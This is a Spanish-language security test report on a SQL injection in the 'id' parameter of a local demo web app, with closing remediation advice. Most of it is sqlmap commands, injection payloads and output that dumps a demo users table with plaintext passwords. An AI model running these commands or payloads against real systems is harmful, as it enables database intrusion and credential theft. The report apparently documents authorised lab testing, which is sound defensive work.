# Informe DAST SQLi - `http://web.dev.local:8083`

## Resumen Ejecutivo

Se confirmó una vulnerabilidad de **SQL injection** en el parámetro GET `id` del formulario principal de `http://web.dev.local:8083/`.

La vulnerabilidad fue **explotada con éxito** mediante `sqlmap`, permitiendo:

- Identificar el motor de base de datos como **MySQL/MariaDB**.
- Extraer el usuario actual de base de datos: `root@%`.
- Extraer la base de datos actual: `sqli_demo`.
- Enumerar bases de datos y tablas.
- Volcar la tabla `sqli_demo.users`, incluyendo nombres de usuario y contraseñas en texto claro.

Impacto: **crítico**. Un atacante remoto puede leer información sensible de la base de datos y comprometer cuentas de usuario.

## Alcance y Metodología

Se siguió el flujo solicitado:

1. Reconocimiento con `curl`.
2. Descubrimiento con `sqlmap --batch`.
3. Explotación activa solo después de confirmar la SQLi.
4. Consolidación de evidencias en este informe.

## Reconocimiento

### URL objetivo

- `http://web.dev.local:8083/`

### Vectores identificados

Se detectó un único formulario HTML en la página principal:

- Método: `GET`
- Acción: `#`
- Parámetros:
  - `id`
  - `Submit`

No se identificaron otros endpoints navegables ni `robots.txt`/`sitemap.xml` útiles:

- `http://web.dev.local:8083/robots.txt` -> `404`
- `http://web.dev.local:8083/sitemap.xml` -> `404`

### Observaciones manuales

Las respuestas manuales variando `id` devolvieron HTML estable, por lo que la inyección no era evidente a simple vista. Sin embargo, `sqlmap` sí consiguió confirmar la inyectabilidad del parámetro cuando se analizó el envío real del formulario (`id` + `Submit`).

## Vectores Analizados

### Vector 1

- URL base: `http://web.dev.local:8083/`
- Tipo: formulario GET
- Parámetro probado: `id`
- Solicitud representativa:

```http
GET /?id=1&Submit=Submit HTTP/1.1
Host: web.dev.local:8083
```

## Hallazgos

## Hallazgo 1 - SQL Injection en `id` (GET)

`sqlmap` confirmó que `id` es vulnerable a múltiples técnicas:

- Boolean-based blind
- Error-based
- Time-based blind
- UNION query

### Evidencia de detección

Comando de descubrimiento exitoso:

```bash
sqlmap --batch --forms --crawl=2 -u 'http://web.dev.local:8083/' --level=5 --risk=3 --flush-session
```

Resultado relevante:

```text
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: id=1874' OR NOT 8684=8684-- fbcZ&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=1874' AND EXTRACTVALUE(1941,CONCAT(0x5c,0x7170766271,(SELECT (ELT(1941=1941,1))),0x71786a6b71))-- bRHe&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1874' AND (SELECT 5803 FROM (SELECT(SLEEP(5)))VDPS)-- FRqG&Submit=Submit

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=1874' UNION ALL SELECT CONCAT(0x7170766271,0x734453504c5378686f41556d41586d476a6c7553636f4154566d436470656f5973527447427a676e,0x71786a6b71),NULL-- -&Submit=Submit
```

## Evidencia de Explotación

### Identificación del backend

Comando:

```bash
sqlmap --batch -u 'http://web.dev.local:8083/?id=1&Submit=Submit' -p id --current-user --current-db --dbs
```

Salida relevante:

```text
current user: 'root@%'
current database: 'sqli_demo'

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli_demo
[*] sys
```

### Enumeración de tablas

Comando:

```bash
sqlmap --batch -u 'http://web.dev.local:8083/?id=1&Submit=Submit' -p id -D sqli_demo --tables
```

Salida relevante:

```text
Database: sqli_demo
[1 table]
+-------+
| users |
+-------+
```

### Enumeración de columnas

Comando:

```bash
sqlmap --batch -u 'http://web.dev.local:8083/?id=1&Submit=Submit' -p id -D sqli_demo -T users --columns
```

Salida relevante:

```text
Database: sqli_demo
Table: users
[6 columns]
+------------+--------------+
| Column     | Type         |
+------------+--------------+
| email      | varchar(100) |
| first_name | varchar(50)  |
| last_name  | varchar(50)  |
| password   | varchar(255) |
| user_id    | int(11)      |
| username   | varchar(50)  |
+------------+--------------+
```

### Volcado de credenciales

Comando:

```bash
sqlmap --batch -u 'http://web.dev.local:8083/?id=1&Submit=Submit' -p id -D sqli_demo -T users --dump
```

Salida relevante:

```text
Database: sqli_demo
Table: users
[8 entries]
+---------+---------------------+-------------+-----------+-----------+------------+
| user_id | email               | password    | username  | last_name | first_name |
+---------+---------------------+-------------+-----------+-----------+------------+
| 1       | admin@example.com   | password123 | admin     | Doe       | John       |
| 2       | jane@example.com    | secret456   | jsmith    | Smith     | Jane       |
| 3       | bob@example.com     | mypass789   | bjohnson  | Johnson   | Bob        |
| 4       | alice@example.com   | qwerty123   | awilliams | Williams  | Alice      |
| 5       | charlie@example.com | password    | cbrown    | Brown     | Charlie    |
| 6       | diana@example.com   | secure123   | ddavis    | Davis     | Diana      |
| 7       | eve@example.com     | hackme      | emiller   | Miller    | Eve        |
| 8       | frank@example.com   | admin123    | fwilson   | Wilson    | Frank      |
+---------+---------------------+-------------+-----------+-----------+------------+
```

Esto demuestra explotación completa con acceso a datos sensibles, incluyendo `username` y `password`.

## Archivos de Evidencia

- `/app/reports/sqlmap_scan_output.txt`
- `/app/reports/sqlmap_forms_scan.txt`
- `/app/reports/sqlmap_exploit_scan.txt`
- `/app/reports/sqlmap_tables.txt`
- `/app/reports/sqlmap_columns.txt`
- `/app/reports/sqlmap_dump_users.txt`
- `/root/.local/share/sqlmap/output/web.dev.local/dump/sqli_demo/users.csv`

## Conclusión

El objetivo `http://web.dev.local:8083` es vulnerable a **SQL injection** en el parámetro GET `id`.

La vulnerabilidad fue **confirmada y explotada** exitosamente, permitiendo enumerar la base de datos y extraer registros de la tabla `users`, incluidas contraseñas en texto claro.

Riesgo final: **crítico**.

Recomendaciones prioritarias:

1. Sustituir concatenación SQL por consultas preparadas/parametrizadas.
2. Validar y tipar estrictamente `id` como entero.
3. Evitar exponer credenciales en texto claro; aplicar hashing robusto (`bcrypt`, `argon2`).
4. Limitar privilegios del usuario de base de datos usado por la aplicación.
5. Añadir registros, alertado y pruebas de seguridad automatizadas para parámetros de entrada.
